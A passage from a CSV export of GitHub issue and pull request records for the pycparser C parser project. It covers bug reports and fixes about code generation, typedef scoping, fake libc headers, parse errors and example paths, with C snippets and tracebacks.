",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/132/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/132/comments,https://api.github.com/repos/eliben/pycparser/issues/132/events,https://github.com/eliben/pycparser/pull/132,https://api.github.com/repos/eliben/pycparser/pulls/132
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/131,165005595,MDU6SXNzdWUxNjUwMDU1OTU=,131,code-generation for ternary operator,16084733,closed,FALSE,NA,NA,1,2016-07-12T06:46:38Z,2016-07-14T12:46:51Z,2016-07-14T12:46:51Z,CONTRIBUTOR,NA,"I had problems with operator precedence when generating code for the ternary operator, original code such as:
`(X == 0) ? (Y=1) : (Y=2)`
which became after parsing and code generation:
`X == 0 ? Y=1 : Y=2`
which causes a compilation error since last assignment has lower precedence, essentially becoming
`(X == 0 ? Y=1 : Y) = 2`
I fixed this in in c_generator.py by modding to:
`def visit_TernaryOp(self, n):`
`s  = '(' + self._visit_expr(n.cond) + ') ? '`
`s += '(' + self._visit_expr(n.iftrue) + ') : '`
`s += '(' + self._visit_expr(n.iffalse) + ')'`
`return s
`
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/131/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/131/comments,https://api.github.com/repos/eliben/pycparser/issues/131/events,https://github.com/eliben/pycparser/issues/131,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/130,161533692,MDExOlB1bGxSZXF1ZXN0NzQ2ODExODU=,130,Fix issue #129: allow reuse of typedef-name as identifier in multi-id…,4563314,closed,FALSE,NA,NA,4,2016-06-21T20:38:09Z,2016-10-07T21:18:21Z,2016-10-07T21:18:21Z,NONE,NA,"…entifier declaration

Issue is reported here:
https://github.com/eliben/pycparser/issues/129
The fix adds 'TYPEID' to the possible values of direct_declarator.
This results in several shift/reduce conflicts, but the tests still
pass.
There is also a new testcase identifying the issue.

I'm not sure whether the shift/reduce conflicts have to be addressed,
but as i have no clue how to avoid them, and the tests all pass, i'm suggesting my fix :)

Here are the actual conflicts:

> Generating LALR tables
> WARNING: 7 shift/reduce conflicts
> WARNING: 57 reduce/reduce conflicts
> WARNING: reduce/reduce conflict in state 19 resolved using rule (direct_declarator -> TYPEID)
> WARNING: rejected rule (typedef_name -> TYPEID) in state 19
> WARNING: reduce/reduce conflict in state 83 resolved using rule (declarator -> pointer TYPEID)
> WARNING: rejected rule (direct_declarator -> TYPEID) in state 83
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/130/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/130/comments,https://api.github.com/repos/eliben/pycparser/issues/130/events,https://github.com/eliben/pycparser/pull/130,https://api.github.com/repos/eliben/pycparser/pulls/130
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/129,160961640,MDU6SXNzdWUxNjA5NjE2NDA=,129,"Parse Error on variable name that is a typedef in an outer scope, when it is declared together with another variable",4563314,closed,FALSE,NA,NA,4,2016-06-17T19:46:10Z,2016-10-12T03:50:56Z,2016-10-12T03:50:56Z,NONE,NA,"Sorry for the long title, but this is a weird circumstance.
This one parses correctly:

``` c
typedef int foo;
void f(){
  int foo;
}
```

Note that ""int foo"" is declared on its own.

This one gives ParseError: test.c:3:10: before: foo

``` c
typedef int foo;
void f(){
  int a, foo;
}
```

Just because there is another variable declared in the same statement.

FYI, I stumbled upon this when trying to parse python's own C source code (3.5.1) with pycparser.
This error happens in floatobject.c.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/129/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/129/comments,https://api.github.com/repos/eliben/pycparser/issues/129/events,https://github.com/eliben/pycparser/issues/129,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/128,157386100,MDExOlB1bGxSZXF1ZXN0NzE4MjcxMzU=,128,Convert readthedocs link for their .org -> .io migration for hosted projects,857609,closed,FALSE,NA,NA,0,2016-05-29T13:20:53Z,2016-06-19T12:12:49Z,2016-06-19T12:12:49Z,CONTRIBUTOR,NA,"As per their email ‘Changes to project subdomains’:

> Starting today, Read the Docs will start hosting projects from subdomains on the domain readthedocs.io, instead of on readthedocs.org. This change addresses some security concerns around site cookies while hosting user generated data on the same domain as our dashboard.

Test Plan: Manually visited all the links I’ve modified.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/128/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/128/comments,https://api.github.com/repos/eliben/pycparser/issues/128/events,https://github.com/eliben/pycparser/pull/128,https://api.github.com/repos/eliben/pycparser/pulls/128
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/127,156647450,MDU6SXNzdWUxNTY2NDc0NTA=,127,The typedefs and other definitions from fake_libc_include conflicts with the actual defines (parsing sqlite.c).,70410,closed,FALSE,NA,NA,5,2016-05-25T02:00:38Z,2017-02-14T00:24:53Z,2016-10-12T03:50:02Z,NONE,NA,"I am trying to parse sqlite.c (amalgamated), and reprint the AST using the `examples/c-to-c.py`. My environment is `Ubuntu 15.04` with `gcc 4.9.2`.  I am using `sqlite 3.13`. My makefile is below.

```
sqlite.c: c/sqlite3.c c/sqlite3.h utils/fake_libc_include/_fake_defines.h
    gcc -nostdinc -D'__attribute__(x)=' -I utils/fake_libc_include/ -E c/sqlite3.c -Ic/ > sqlite.c_
    mv sqlite.c_ sqlite.c

s.c: sqlite.c
    python3 ./examples/c-to-c.py sqlite.c > s.c_
    mv s.c_ s.c

s: s.c
    gcc s.c c/shell.c -o s
```

On running the `gcc s.c` command, it fails with

```
s.c:3:13: error: conflicting types for ‘__builtin_va_list’
 typedef int __builtin_va_list;

s.c:2816:22: note: expected ‘struct __va_list_tag *’ but argument is of type ‘int’
s.c:2843:25: error: expected ‘,’ before ‘)’ token
     *__builtin_va_arg(ap) = val;
                         ^

```

and

```
s.c:3192:5: error: dereferencing pointer to incomplete type
     *pTm = *pX;
     ^
s.c:3192:12: error: dereferencing pointer to incomplete type
     *pTm = *pX;
            ^
s.c: In function ‘localtimeOffset’:
s.c:3204:13: error: storage size of ‘sLocal’ isn’t known
   struct tm sLocal;
             ^
```

I assumed from the `Changelog` that I would be able to parse and reprint the AST of `sqlite.c`. Is it supported?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/127/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/127/comments,https://api.github.com/repos/eliben/pycparser/issues/127/events,https://github.com/eliben/pycparser/issues/127,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/126,156038870,MDU6SXNzdWUxNTYwMzg4NzA=,126,ParseError when condition contains compound,2072203,closed,FALSE,NA,NA,2,2016-05-20T19:52:20Z,2016-05-20T20:49:02Z,2016-05-20T20:49:02Z,NONE,NA,"Thanks for the great tool. I found that the latest version of pycparser fails when parsing a conditional that contains a compound. For example, if the following text is stored in `bug.c`:

```
int foo() {
    return 1;
}
int main(void) {
    int x;
    if(({x = foo();})) {
        return 1;
    }
    return 0;
}
```

It compiles ok via recent `gcc`...

```
$ gcc bug.c
```

... but pycparser fails:

```
$ python -c ""from pycparser import parse_file; parse_file('bug.c')"" 
Traceback (most recent call last):
  File ""<string>"", line 1, in <module>
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 146, in parse
    debug=debuglevel)
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1680, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/redacted/venv/local/lib/python2.7/site-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: bug.c:7:9: before: {
```

Info on my environment:

```
$ pip freeze | grep pycparser
pycparser==2.14
$ gcc --version
gcc (Ubuntu 4.9.2-10ubuntu13) 4.9.2
Copyright (C) 2014 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

The error may be in `ply` but I figured I'd report here first and defer to an expert. Thanks again.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/126/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/126/comments,https://api.github.com/repos/eliben/pycparser/issues/126/events,https://github.com/eliben/pycparser/issues/126,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/125,155941289,MDU6SXNzdWUxNTU5NDEyODk=,125,support gcc  __attribute__  keyword,5601971,closed,FALSE,NA,NA,1,2016-05-20T11:18:46Z,2016-10-10T14:01:28Z,2016-10-10T14:01:28Z,NONE,NA,"add to support gcc  **attribute**((inline))   related keywords support ?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/125/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/125/comments,https://api.github.com/repos/eliben/pycparser/issues/125/events,https://github.com/eliben/pycparser/issues/125,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/124,154847920,MDU6SXNzdWUxNTQ4NDc5MjA=,124,Considering comments,10199742,closed,FALSE,NA,NA,7,2016-05-14T11:07:57Z,2016-10-13T20:38:03Z,2016-10-13T20:38:03Z,NONE,NA,"If comments would be provided in the AST pycparser could be used as frontend for a wider range of features implemented by code analyzers (e.g. code to comment ratio), diagram generators (e.g. comments as process indicators for flowcharts/tagged comments as process block indicators for flowgraphs), etc.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/124/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/124/comments,https://api.github.com/repos/eliben/pycparser/issues/124/events,https://github.com/eliben/pycparser/issues/124,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/123,154847084,MDU6SXNzdWUxNTQ4NDcwODQ=,123,Potential embedded domain compiler issues,10199742,closed,FALSE,NA,NA,2,2016-05-14T10:48:38Z,2016-05-18T22:06:07Z,2016-05-18T22:06:07Z,NONE,NA,"# In the domain of embedded system development there are a lot of microprocessor specific compilers available. About what potential issues do i have to think about when i want to preprocess c files with these specific compilers instead of using cpp ([or gcc or clang](https://github.com/eliben/pycparser#31interaction-with-the-c-preprocessor)). It seems like there is a lot potential for issues related to extensions and configuration e.g. with MSVC #91.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/123/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/123/comments,https://api.github.com/repos/eliben/pycparser/issues/123/events,https://github.com/eliben/pycparser/issues/123,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/122,152018930,MDU6SXNzdWUxNTIwMTg5MzA=,122,example: func_defs.py - error: unterminated conditional directive,3506172,closed,FALSE,NA,NA,1,2016-04-30T08:58:48Z,2016-04-30T12:39:01Z,2016-04-30T12:39:01Z,NONE,NA,"While trying to run example 'func_defs.py' on OS X 10.11 with Python 2.7.10 I got:

```
In file included from ../http_parser.c:29:
In file included from /usr/include/stdlib.h:61:
In file included from /usr/include/Availability.h:172:
/usr/include/AvailabilityInternal.h:15284:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_11
         ^
/usr/include/AvailabilityInternal.h:15229:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_10_3
         ^
/usr/include/AvailabilityInternal.h:15178:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_10_2
         ^
/usr/include/AvailabilityInternal.h:15131:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_10
         ^
/usr/include/AvailabilityInternal.h:15088:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_9
         ^
/usr/include/AvailabilityInternal.h:15049:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_8
         ^
/usr/include/AvailabilityInternal.h:15014:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_7
         ^
/usr/include/AvailabilityInternal.h:14983:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_6
         ^
/usr/include/AvailabilityInternal.h:14956:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_5
         ^
/usr/include/AvailabilityInternal.h:14933:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_4
         ^
/usr/include/AvailabilityInternal.h:14914:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_3
         ^
/usr/include/AvailabilityInternal.h:14899:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_2
         ^
/usr/include/AvailabilityInternal.h:14888:10: error: unterminated conditional directive
        #if __MAC_OS_X_VERSION_MIN_REQUIRED >= __MAC_10_1
         ^
/usr/include/AvailabilityInternal.h:30:2: error: unterminated conditional directive
#ifndef __AVAILABILITY_INTERNAL__
 ^
In file included from ../http_parser.c:29:
In file included from /usr/include/stdlib.h:61:
/usr/include/Availability.h:218:2: error: #else without #if
#else
 ^
/usr/include/Availability.h:221:2: error: #endif without #if
#endif
 ^
/usr/include/Availability.h:257:2: error: #endif without #if
#endif
 ^
/usr/include/Availability.h:284:2: error: #endif without #if
#endif
 ^
/usr/include/Availability.h:311:2: error: #endif without #if
#endif
```

Trying to parse https://github.com/nodejs/http-parser/blob/master/http_parser.c

Latest git version installed with `python setup.py install`.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/122/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/122/comments,https://api.github.com/repos/eliben/pycparser/issues/122/events,https://github.com/eliben/pycparser/issues/122,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/121,148816547,MDExOlB1bGxSZXF1ZXN0NjY3Mjc3NTU=,121,Upgrade ply to 3.8,3085290,closed,FALSE,NA,NA,3,2016-04-16T04:37:17Z,2016-04-19T12:20:50Z,2016-04-19T12:12:37Z,CONTRIBUTOR,NA,"Got bitten by a bug today that's fixed in ply 3.6, so I figured I'd share the fix, which is just upgrading the bundled version of ply.

Travis builds succeeded, but I confess I couldn't get one test to pass on my machine (OS X, Python 2.7), either before or after the changes. Stack trace is below in case you're curious, but it's a separate issue. Let me know if you want more information, but otherwise I won't worry about it.

Let me know if I can do anything else to help. I'm new to open source, so apologies for any rookie mistakes. Cheers, and thanks for the great work!

```
ERROR: test_with_cpp (test_general.TestParsing)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/Users/fwagner/dev/pycparser/tests/test_general.py"", line 31, in test_with_cpp
    cpp_args='-I%s' % c_files_path)
  File ""./pycparser/__init__.py"", line 94, in parse_file
    return parser.parse(text, filename)
  File ""./pycparser/c_parser.py"", line 147, in parse
    debug=debuglevel)
  File ""./pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""./pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""./pycparser/c_parser.py"", line 1700, in p_error
    column=self.clex.find_tok_column(p)))
  File ""./pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
ParseError: /Users/fwagner/dev/pycparser/tests/c_files/memmgr.c:1:1: before: /
```
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/121/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/121/comments,https://api.github.com/repos/eliben/pycparser/issues/121/events,https://github.com/eliben/pycparser/pull/121,https://api.github.com/repos/eliben/pycparser/pulls/121
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/120,145827033,MDExOlB1bGxSZXF1ZXN0NjUyMjYxODA=,120,"Add ""get_parameter_parser()"" to create 'targeted' Parser",1715611,closed,FALSE,NA,NA,6,2016-04-04T22:54:30Z,2017-02-26T14:06:55Z,2017-02-26T14:06:55Z,NONE,NA,"rewritten version without special Lexer symbol; does more PLY processing runs instead

---

this returns another instance of CParser that is created with a copy of
the parser's current known symbols, and set to function parameter
context as grammar starting symbol.  It's parse function can be called
with a string describing a single parameter, as shown in eval.py:

$ python eval.py fifo.h

> struct fifo \* const \* x
> Decl: x, [], [], []
>   PtrDecl: []
>     PtrDecl: ['const']
>       TypeDecl: x, []
>         Struct: fifo
> int
> Typename: None, []
>   TypeDecl: None, []
>     IdentifierType: ['int']
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/120/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/120/comments,https://api.github.com/repos/eliben/pycparser/issues/120/events,https://github.com/eliben/pycparser/pull/120,https://api.github.com/repos/eliben/pycparser/pulls/120
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/119,145381078,MDExOlB1bGxSZXF1ZXN0NjUwNDAxNDU=,119,"Add ""evalparam"" method to parse a single def",1715611,closed,FALSE,NA,NA,5,2016-04-02T14:57:28Z,2016-04-03T21:41:43Z,2016-04-03T21:41:43Z,NONE,NA,"Very useful for tools that want to hunt down details after loading a file.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/119/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/119/comments,https://api.github.com/repos/eliben/pycparser/issues/119/events,https://github.com/eliben/pycparser/pull/119,https://api.github.com/repos/eliben/pycparser/pulls/119
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/118,142083958,MDU6SXNzdWUxNDIwODM5NTg=,118,Problem with lexical scoping in declaration list,7487072,closed,FALSE,NA,NA,3,2016-03-19T17:30:04Z,2017-02-11T23:50:08Z,2017-02-11T23:50:08Z,NONE,NA,"An ID in the local scope(which can shadow a TYPEID in higher scope) is being recognized as a TYPEID which is already defined at a higher scope level and this happens only in a declaration list. 

Consider this example
Case 1: The type_lookup_func recognizes the second variable ""a"" as an already defined TYPEID and crashes. 

```
src=""""""
    typedef int a;
    int main()
    {
        int a,b;
    }
""""
```

```
>
  File ""/home/vijay/script/pycparser/pycparser/c_parser.py"", line 1705, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/home/vijay/script/pycparser/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: :5:14: before: ,
```

Case 2: However the below example works just fine

```
src=""""""
typedef int a;
int main(void)
{
int a;
int b;
}
p.parse(src).show()
```

```
FileAST:
  Typedef: a, [], ['typedef']
    TypeDecl: a, []
      IdentifierType: ['int']
  FuncDef:
    Decl: main, [], [], []
      FuncDecl:
        TypeDecl: main, []
          IdentifierType: ['int']
    Compound:
      Decl: a, [], [], []
        TypeDecl: a, []
          IdentifierType: ['int']
      Decl: b, [], [], []
        TypeDecl: b, []
          IdentifierType: ['int']
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/118/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/118/comments,https://api.github.com/repos/eliben/pycparser/issues/118/events,https://github.com/eliben/pycparser/issues/118,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/117,141182348,MDU6SXNzdWUxNDExODIzNDg=,117,pycparser fails to parse extra semi-colons in structure declaration list,7487072,closed,FALSE,NA,NA,1,2016-03-16T06:07:36Z,2016-03-19T12:22:44Z,2016-03-19T12:22:19Z,NONE,NA,"Parser throws error if declarators inside of a structure have extra "";;"" terminators. However, it works if the declarator is outside of a structure or an union declaration. 

`
from pycparser import c_parser, c_ast
 p = c_parser.CParser()
src=""int a;;;""
p.parse(src)
p.parse(src).show()
`

> FileAST:
>   Decl: a, [], [], []
>     TypeDecl: a, []
>       IdentifierType: ['int']
> 
> `
> src=""""""struct foo {
> ... int a;;
> ... };""""""
>  p.parse(src).show()
> `
> 
> Traceback (most recent call last):
>   File ""<stdin>"", line 1, in <module>
>   File ""pycparser/c_parser.py"", line 146, in parse
>     debug=debuglevel)
>   File ""pycparser/ply/yacc.py"", line 265, in parse
>     return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
>   File ""pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
>     tok = self.errorfunc(errtoken)
>   File ""pycparser/c_parser.py"", line 1680, in p_error
>     column=self.clex.find_tok_column(p)))
>   File ""pycparser/plyparser.py"", line 55, in _parse_error
>     raise ParseError(""%s: %s"" % (coord, msg))
> pycparser.plyparser.ParseError: :2:7: before: ;
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/117/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/117/comments,https://api.github.com/repos/eliben/pycparser/issues/117/events,https://github.com/eliben/pycparser/issues/117,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/116,139954108,MDU6SXNzdWUxMzk5NTQxMDg=,116,Line numbers set to 0,4165599,closed,FALSE,NA,NA,6,2016-03-10T17:10:06Z,2016-10-12T03:45:31Z,2016-10-12T03:45:31Z,NONE,NA,"Hi,

First of all, thanks for the work done over here.
I've noticed that field `.coord.line` is systematically set to 0 for nodes of classes `Compound` and `EmptyStatement` (and maybe some others).

For instance, considering below file _toto.c_ :

```
void f() {
  if (1) {
    ;
  } else {
    return;
  }
}
```

Pycparser give me this :

```
>>> import pycparser
>>> ast = pycparser.parse_file(""toto.c"")
>>> ast.show(showcoord=True)
FileAST:  (at None)
  FuncDef:  (at toto.c:1)
    Decl: f, [], [], [] (at toto.c:1)
      FuncDecl:  (at toto.c:1)
        TypeDecl: f, [] (at toto.c:1)
          IdentifierType: ['void'] (at toto.c:1)
    Compound:  (at toto.c:0)
      If:  (at toto.c:2)
        Constant: int, 1 (at toto.c:2)
        Compound:  (at toto.c:0)
          EmptyStatement:  (at toto.c:0)
        Compound:  (at toto.c:0)
          Return:  (at toto.c:5)
```

Is this an implementation choice, a known issue, a new one ?

Regards
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/116/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/116/comments,https://api.github.com/repos/eliben/pycparser/issues/116/events,https://github.com/eliben/pycparser/issues/116,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/115,139472176,MDExOlB1bGxSZXF1ZXN0NjIxNzgyNDU=,115,Fix trivial comment typo.,203893,closed,FALSE,NA,NA,0,2016-03-09T04:24:48Z,2016-03-09T16:59:52Z,2016-03-09T16:59:52Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/115/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/115/comments,https://api.github.com/repos/eliben/pycparser/issues/115/events,https://github.com/eliben/pycparser/pull/115,https://api.github.com/repos/eliben/pycparser/pulls/115
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/114,136385999,MDExOlB1bGxSZXF1ZXN0NjA2NzcxMzk=,114,fixed pathes to c-sources in examples,11477427,closed,FALSE,NA,NA,5,2016-02-25T13:21:09Z,2016-02-26T13:40:15Z,2016-02-26T13:40:15Z,NONE,NA,"There have been some wrong pathes in examples like `filename = 'examples/c_files/year.c'`
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/114/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/114/comments,https://api.github.com/repos/eliben/pycparser/issues/114/events,https://github.com/eliben/pycparser/pull/114,https://api.github.com/repos/eliben/pycparser/pulls/114
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/113,136313686,MDU6SXNzdWUxMzYzMTM2ODY=,113,Wrong path in using_gcc_E_libc.py,11477427,closed,FALSE,NA,NA,3,2016-02-25T08:06:18Z,2016-02-25T13:21:49Z,2016-02-25T13:21:49Z,NONE,NA,"In using_gcc_E_libc.py there is a wrong path to file used in this example.
{code}filename = 'examples/c_files/year.c'{code}
Can be fixed by changing path to 'c_files/year.c'
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/113/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/113/comments,https://api.github.com/repos/eliben/pycparser/issues/113/events,https://github.com/eliben/pycparser/issues/113,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/112,132857383,MDU6SXNzdWUxMzI4NTczODM=,112,"struct t_some {int Foo;}  var1,var2;",2973609,closed,FALSE,NA,NA,8,2016-02-11T00:18:28Z,2016-03-19T12:39:36Z,2016-03-19T12:39:36Z,NONE,NA,"Dear,

When the input contains the construction in subject, c_generator transforms to 

```
struct t_some
{
int Foo;
} var1;
struct t_some
{
int Foo;
} var2;
```

Which doesn't compile.
Is this an issue or am I doing something wrong ?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/112/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/112/comments,https://api.github.com/repos/eliben/pycparser/issues/112/events,https://github.com/eliben/pycparser/issues/112,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/111,127679466,MDExOlB1bGxSZXF1ZXN0NTY2MDU3Njg=,111,Problem: can't parse code from https://github.com/zeromq/malamute,202731,closed,FALSE,NA,NA,1,2016-01-20T13:13:57Z,2016-01-22T01:41:23Z,2016-01-22T00:35:12Z,NONE,NA,"Solution: more fake headers and some typedefs from asm-generic/int-ll64.h

Thanks for making a useful project!
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/111/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/111/comments,https://api.github.com/repos/eliben/pycparser/issues/111/events,https://github.com/eliben/pycparser/pull/111,https://api.github.com/repos/eliben/pycparser/pulls/111
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/110,126662316,MDU6SXNzdWUxMjY2NjIzMTY=,110,ParseError: /usr/include/stdint.h:57:1: before: __extension__,9463528,closed,FALSE,NA,NA,2,2016-01-14T14:14:55Z,2016-01-14T18:11:12Z,2016-01-14T17:24:55Z,NONE,NA,"I tried to install panda (https://github.com/moyix/panda) on my Ubuntu 14.04 32bit system. I used the ""panda_install_bash"" script as recommended from their repository.
The Installation went well up to the point where it said:

Building API for plugin taint
Traceback (most recent call last):
  File ""../scripts/apigen.py"", line 198, in <module>
    generate_api(plugin, plugin_dir)
  File ""../scripts/apigen.py"", line 164, in generate_api
    arglist = get_arglists(pf)
  File ""../scripts/apigen.py"", line 24, in get_arglists
    p = pyc.parse(pf)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 146, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py"", line 1680, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py"", line 55, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/include/stdint.h:57:1: before: __extension__

In the /usr/include/stdint.h I have:

47   /\* Unsigned.  */
48   typedef unsigned char      uint8_t;
49   typedef unsigned short int uint16_t;
50   #ifndef **uint32_t_defined
51   typedef unsigned int       uint32_t;
52   # define __uint32_t_defined
53   #endif
54   #if __WORDSIZE == 64
55   typedef unsigned long int  uint64_t;
56   #else
57   __extension**
58   typedef unsigned long long int uint64_t;
59   #endif

Any idea what this error is about?
Thanks for any hints!
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/110/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/110/comments,https://api.github.com/repos/eliben/pycparser/issues/110/events,https://github.com/eliben/pycparser/issues/110,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/109,122220825,MDExOlB1bGxSZXF1ZXN0NTM2NzQyMzA=,109,Update c_generator to add {} around nested NamedInitializers,682658,closed,FALSE,NA,NA,1,2015-12-15T08:42:31Z,2015-12-15T13:47:53Z,2015-12-15T13:47:47Z,CONTRIBUTOR,NA,"I've monkey-patched this change in my project which depends on pycparser: http://github.com/jamie-pate/jstruct . It allows nested NamedInitializer lists by calling `_visit_expr()` instead of `visit()` inside `visit_NamedInitializer`.
